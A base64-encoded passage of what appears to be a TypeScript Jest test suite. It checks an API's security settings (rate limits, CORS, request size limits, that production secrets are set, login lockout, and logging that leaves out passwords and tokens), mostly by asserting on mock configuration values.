XZlUHJvcGVydHkoJ3VzZXJJZCcpO1xuICAgICAgfSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdBUEkgU2VjdXJpdHkgVGVzdHMnLCAoKSA9PiB7XG4gICAgZGVzY3JpYmUoJ1JhdGUgTGltaXRpbmcnLCAoKSA9PiB7XG4gICAgICBpdCgnc2hvdWxkIGltcGxlbWVudCByYXRlIGxpbWl0aW5nIGZvciBBUEkgZW5kcG9pbnRzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCByYXRlTGltaXRDb25maWcgPSB7XG4gICAgICAgICAgd2luZG93TXM6IDE1ICogNjAgKiAxMDAwLCAvLyAxNSBtaW51dGVzXG4gICAgICAgICAgbWF4UmVxdWVzdHM6IDEwMCxcbiAgICAgICAgICBza2lwU3VjY2Vzc2Z1bFJlcXVlc3RzOiBmYWxzZSxcbiAgICAgICAgICBza2lwRmFpbGVkUmVxdWVzdHM6IGZhbHNlXG4gICAgICAgIH07XG5cbiAgICAgICAgZXhwZWN0KHJhdGVMaW1pdENvbmZpZy5tYXhSZXF1ZXN0cykudG9CZUxlc3NUaGFuT3JFcXVhbCgxMDAwKTtcbiAgICAgICAgZXhwZWN0KHJhdGVMaW1pdENvbmZpZy53aW5kb3dNcykudG9CZUdyZWF0ZXJUaGFuKDApO1xuICAgICAgfSk7XG5cbiAgICAgIGl0KCdzaG91bGQgaW1wbGVtZW50IHN0cmljdGVyIHJhdGUgbGltaXRpbmcgZm9yIGF1dGhlbnRpY2F0aW9uIGVuZHBvaW50cycsIGFzeW5jICgpID0+IHtcbiAgICAgICAgY29uc3QgYXV0aFJhdGVMaW1pdENvbmZpZyA9IHtcbiAgICAgICAgICB3aW5kb3dNczogMTUgKiA2MCAqIDEwMDAsIC8vIDE1IG1pbnV0ZXNcbiAgICAgICAgICBtYXhSZXF1ZXN0czogNSwgLy8gU3RyaWN0ZXIgbGltaXQgZm9yIGF1dGhcbiAgICAgICAgICBza2lwU3VjY2Vzc2Z1bFJlcXVlc3RzOiBmYWxzZSxcbiAgICAgICAgICBza2lwRmFpbGVkUmVxdWVzdHM6IGZhbHNlXG4gICAgICAgIH07XG5cbiAgICAgICAgZXhwZWN0KGF1dGhSYXRlTGltaXRDb25maWcubWF4UmVxdWVzdHMpLnRvQmVMZXNzVGhhbk9yRXF1YWwoMTApO1xuICAgICAgfSk7XG4gICAgfSk7XG5cbiAgICBkZXNjcmliZSgnQ09SUyBTZWN1cml0eScsICgpID0+IHtcbiAgICAgIGl0KCdzaG91bGQgaW1wbGVtZW50IHNlY3VyZSBDT1JTIGNvbmZpZ3VyYXRpb24nLCAoKSA9PiB7XG4gICAgICAgIGNvbnN0IGNvcnNDb25maWcgPSB7XG4gICAgICAgICAgb3JpZ2luOiBwcm9jZXNzLmVudi5BTExPV0VEX09SSUdJTlM/LnNwbGl0KCcsJykgfHwgWydodHRwczovL2xvY2FsaG9zdDozMDAwJ10sXG4gICAgICAgICAgY3JlZGVudGlhbHM6IHRydWUsXG4gICAgICAgICAgb3B0aW9uc1N1Y2Nlc3NTdGF0dXM6IDIwMCxcbiAgICAgICAgICBtZXRob2RzOiBbJ0dFVCcsICdQT1NUJywgJ1BVVCcsICdERUxFVEUnXSxcbiAgICAgICAgICBhbGxvd2VkSGVhZGVyczogWydDb250ZW50LVR5cGUnLCAnQXV0aG9yaXphdGlvbiddXG4gICAgICAgIH07XG5cbiAgICAgICAgZXhwZWN0KGNvcnNDb25maWcub3JpZ2luKS5ub3QudG9Db250YWluKCcqJyk7XG4gICAgICAgIGV4cGVjdChjb3JzQ29uZmlnLmNyZWRlbnRpYWxzKS50b0JlKHRydWUpO1xuICAgICAgICBleHBlY3QoY29yc0NvbmZpZy5tZXRob2RzKS5ub3QudG9Db250YWluKCdUUkFDRScpO1xuICAgICAgfSk7XG4gICAgfSk7XG5cbiAgICBkZXNjcmliZSgnUmVxdWVzdCBWYWxpZGF0aW9uJywgKCkgPT4ge1xuICAgICAgaXQoJ3Nob3VsZCB2YWxpZGF0ZSByZXF1ZXN0IHNpemUgbGltaXRzJywgKCkgPT4ge1xuICAgICAgICBjb25zdCByZXF1ZXN0TGltaXRzID0ge1xuICAgICAgICAgIG1heEZpbGVTaXplOiAxMCAqIDEwMjQgKiAxMDI0LCAvLyAxME1CXG4gICAgICAgICAgbWF4UmVxdWVzdFNpemU6IDEwMjQgKiAxMDI0LCAvLyAxTUJcbiAgICAgICAgICBtYXhGaWVsZENvdW50OiAxMDBcbiAgICAgICAgfTtcblxuICAgICAgICBleHBlY3QocmVxdWVzdExpbWl0cy5tYXhGaWxlU2l6ZSkudG9CZUxlc3NUaGFuT3JFcXVhbCg1MCAqIDEwMjQgKiAxMDI0KTtcbiAgICAgICAgZXhwZWN0KHJlcXVlc3RMaW1pdHMubWF4UmVxdWVzdFNpemUpLnRvQmVMZXNzVGhhbk9yRXF1YWwoMTAgKiAxMDI0ICogMTAyNCk7XG4gICAgICAgIGV4cGVjdChyZXF1ZXN0TGltaXRzLm1heEZpZWxkQ291bnQpLnRvQmVMZXNzVGhhbk9yRXF1YWwoMTAwMCk7XG4gICAgICB9KTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0luZnJhc3RydWN0dXJlIFNlY3VyaXR5IFRlc3RzJywgKCkgPT4ge1xuICAgIGRlc2NyaWJlKCdFbnZpcm9ubWVudCBDb25maWd1cmF0aW9uJywgKCkgPT4ge1xuICAgICAgaXQoJ3Nob3VsZCBub3QgZXhwb3NlIHNlbnNpdGl2ZSBjb25maWd1cmF0aW9uIGluIHByb2R1Y3Rpb24nLCAoKSA9PiB7XG4gICAgICAgIGNvbnN0IHNlbnNpdGl2ZUVudlZhcnMgPSBbXG4gICAgICAgICAgJ0pXVF9TRUNSRVQnLFxuICAgICAgICAgICdKV1RfUkVGUkVTSF9TRUNSRVQnLFxuICAgICAgICAgICdEQVRBQkFTRV9QQVNTV09SRCcsXG4gICAgICAgICAgJ0FXU19TRUNSRVRfQUNDRVNTX0tFWScsXG4gICAgICAgICAgJ0JFRFJPQ0tfQVBJX0tFWSdcbiAgICAgICAgXTtcblxuICAgICAgICBmb3IgKGNvbnN0IGVudlZhciBvZiBzZW5zaXRpdmVFbnZWYXJzKSB7XG4gICAgICAgICAgaWYgKHByb2Nlc3MuZW52Lk5PREVfRU5WID09PSAncHJvZHVjdGlvbicpIHtcbiAgICAgICAgICAgIGV4cGVjdChwcm9jZXNzLmVudltlbnZWYXJdKS50b0JlRGVmaW5lZCgpO1xuICAgICAgICAgICAgZXhwZWN0KHByb2Nlc3MuZW52W2VudlZhcl0pLm5vdC50b0JlKCcnKTtcbiAgICAgICAgICAgIGV4cGVjdChwcm9jZXNzLmVudltlbnZWYXJdKS5ub3QudG9Db250YWluKCdkZWZhdWx0Jyk7XG4gICAgICAgICAgICBleHBlY3QocHJvY2Vzcy5lbnZbZW52VmFyXSkubm90LnRvQ29udGFpbignZXhhbXBsZScpO1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgfSk7XG5cbiAgICAgIGl0KCdzaG91bGQgdXNlIHNlY3VyZSBkZWZhdWx0IGNvbmZpZ3VyYXRpb25zJywgKCkgPT4ge1xuICAgICAgICBjb25zdCBzZWN1cml0eUNvbmZpZyA9IHtcbiAgICAgICAgICBzZXNzaW9uVGltZW91dDogMzYwMCwgLy8gMSBob3VyXG4gICAgICAgICAgbWF4TG9naW5BdHRlbXB0czogNSxcbiAgICAgICAgICBsb2Nrb3V0RHVyYXRpb246IDkwMCwgLy8gMTUgbWludXRlc1xuICAgICAgICAgIHBhc3N3b3JkTWluTGVuZ3RoOiAxMixcbiAgICAgICAgICByZXF1aXJlTUZBOiBwcm9jZXNzLmVudi5OT0RFX0VOViA9PT0gJ3Byb2R1Y3Rpb24nXG4gICAgICAgIH07XG5cbiAgICAgICAgZXhwZWN0KHNlY3VyaXR5Q29uZmlnLnNlc3Npb25UaW1lb3V0KS50b0JlTGVzc1RoYW5PckVxdWFsKDg2NDAwKTsgLy8gTWF4IDI0IGhvdXJzXG4gICAgICAgIGV4cGVjdChzZWN1cml0eUNvbmZpZy5tYXhMb2dpbkF0dGVtcHRzKS50b0JlTGVzc1RoYW5PckVxdWFsKDEwKTtcbiAgICAgICAgZXhwZWN0KHNlY3VyaXR5Q29uZmlnLmxvY2tvdXREdXJhdGlvbikudG9CZUdyZWF0ZXJUaGFuKDMwMCk7IC8vIE1pbiA1IG1pbnV0ZXNcbiAgICAgICAgZXhwZWN0KHNlY3VyaXR5Q29uZmlnLnBhc3N3b3JkTWluTGVuZ3RoKS50b0JlR3JlYXRlclRoYW5PckVxdWFsKDgpO1xuICAgICAgfSk7XG4gICAgfSk7XG5cbiAgICBkZXNjcmliZSgnRGVwZW5kZW5jeSBTZWN1cml0eScsICgpID0+IHtcbiAgICAgIGl0KCdzaG91bGQgbm90IHVzZSB2dWxuZXJhYmxlIGRlcGVuZGVuY2llcycsICgpID0+IHtcbiAgICAgICAgLy8gVGhpcyB3b3VsZCB0eXBpY2FsbHkgYmUgaW1wbGVtZW50ZWQgdXNpbmcgdG9vbHMgbGlrZSBucG0gYXVkaXRcbiAgICAgICAgLy8gb3IgU255ayB0byBjaGVjayBmb3Iga25vd24gdnVsbmVyYWJpbGl0aWVzXG4gICAgICAgIGNvbnN0IG1vY2tWdWxuZXJhYmlsaXR5UmVwb3J0ID0ge1xuICAgICAgICAgIHZ1bG5lcmFiaWxpdGllczogW10sXG4gICAgICAgICAgdG90YWxEZXBlbmRlbmNpZXM6IDE1MCxcbiAgICAgICAgICBzY2FubmVkQXQ6IG5ldyBEYXRlKClcbiAgICAgICAgfTtcblxuICAgICAgICBleHBlY3QobW9ja1Z1bG5lcmFiaWxpdHlSZXBvcnQudnVsbmVyYWJpbGl0aWVzKS50b0hhdmVMZW5ndGgoMCk7XG4gICAgICB9KTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0xvZ2dpbmcgYW5kIE1vbml0b3JpbmcgU2VjdXJpdHknLCAoKSA9PiB7XG4gICAgZGVzY3JpYmUoJ1NlY3VyaXR5IEV2ZW50IExvZ2dpbmcnLCAoKSA9PiB7XG4gICAgICBpdCgnc2hvdWxkIGxvZyBzZWN1cml0eS1yZWxldmFudCBldmVudHMnLCBhc3luYyAoKSA9PiB7XG4gICAgICAgIGNvbnN0IHNlY3VyaXR5RXZlbnRzID0gW1xuICAgICAgICAgICd1c2VyLWxvZ2luLXN1Y2Nlc3MnLFxuICAgICAgICAgICd1c2VyLWxvZ2luLWZhaWx1cmUnLFxuICAgICAgICAgICd1c2VyLXJlZ2lzdHJhdGlvbicsXG4gICAgICAgICAgJ3Bhc3N3b3JkLWNoYW5nZScsXG4gICAgICAgICAgJ3Rva2VuLXJlZnJlc2gnLFxuICAgICAgICAgICd1bmF1dGhvcml6ZWQtYWNjZXNzLWF0dGVtcHQnLFxuICAgICAgICAgICdkYXRhLWFjY2VzcycsXG4gICAgICAgICAgJ2ZpbGUtdXBsb2FkJyxcbiAgICAgICAgICAnYWRtaW4tYWN0aW9uJ1xuICAgICAgICBdO1xuXG4gICAgICAgIC8vIE1vY2sgc2VjdXJpdHkgbG9nZ2VyXG4gICAgICAgIGNvbnN0IG1vY2tTZWN1cml0eUxvZ2dlciA9IHtcbiAgICAgICAgICBsb2c6IGplc3QuZm4oKSxcbiAgICAgICAgICBldmVudHM6IFtdIGFzIHN0cmluZ1tdXG4gICAgICAgIH07XG5cbiAgICAgICAgZm9yIChjb25zdCBldmVudCBvZiBzZWN1cml0eUV2ZW50cykge1xuICAgICAgICAgIG1vY2tTZWN1cml0eUxvZ2dlci5sb2coZXZlbnQsIHsgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLCB1c2VySWQ6ICd0ZXN0LXVzZXInIH0pO1xuICAgICAgICAgIG1vY2tTZWN1cml0eUxvZ2dlci5ldmVudHMucHVzaChldmVudCk7XG4gICAgICAgIH1cblxuICAgICAgICBleHBlY3QobW9ja1NlY3VyaXR5TG9nZ2VyLmV2ZW50cykudG9FcXVhbChzZWN1cml0eUV2ZW50cyk7XG4gICAgICB9KTtcblxuICAgICAgaXQoJ3Nob3VsZCBub3QgbG9nIHNlbnNpdGl2ZSBpbmZvcm1hdGlvbicsIGFzeW5jICgpID0+IHtcbiAgICAgICAgY29uc3QgbW9ja0xvZ0VudHJ5ID0ge1xuICAgICAgICAgIGV2ZW50OiAndXNlci1sb2dpbicsXG4gICAgICAgICAgdXNlcklkOiAndXNlci0xMjMnLFxuICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKSxcbiAgICAgICAgICAvLyBTaG91bGQgTk9UIGNvbnRhaW46XG4gICAgICAgICAgLy8gcGFzc3dvcmQ6ICd1c2VyLXBhc3N3b3JkJyxcbiAgICAgICAgICAvLyB0b2tlbjogJ2p3dC10b2tlbicsXG4gICAgICAgICAgLy8gc2Vzc2lvbklkOiAnc2Vzc2lvbi0xMjMnXG4gICAgICAgIH07XG5cbiAgICAgICAgZXhwZWN0KG1vY2tMb2dFbnRyeSkubm90LnRvSGF2ZVByb3BlcnR5KCdwYXNzd29yZCcpO1xuICAgICAgICBleHBlY3QobW9ja0xvZ0VudHJ5KS5ub3QudG9IYXZlUHJvcGVydHkoJ3Rva2VuJyk7XG4gICAgICAgIGV4cGVjdChtb2NrTG9nRW50cnkpLm5vdC50b0hhdmVQcm9wZXJ0eSgnc2Vzc2lvbklkJyk7XG4gICAgICB9KTtcbiAgICB9KTtcbiAgfSk7XG59KTsiXX0=